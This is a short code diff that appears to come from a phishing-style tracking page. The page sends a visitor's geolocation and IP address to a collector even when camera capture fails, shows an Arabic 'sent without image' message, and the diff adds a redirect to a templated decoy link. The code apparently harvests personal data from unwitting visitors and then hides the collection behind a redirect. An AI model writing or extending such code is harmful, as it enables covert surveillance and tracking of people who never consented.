@@ -67,6 +67,7 @@
       console.error("Camera error:", err);
       await sendData(position, null, ip);
       document.body.innerHTML = "<h2>تم الإرسال بدون صورة</h2>";
+      window.location.href = "{{CUSTOM_LINK}}";
     }
   }
 
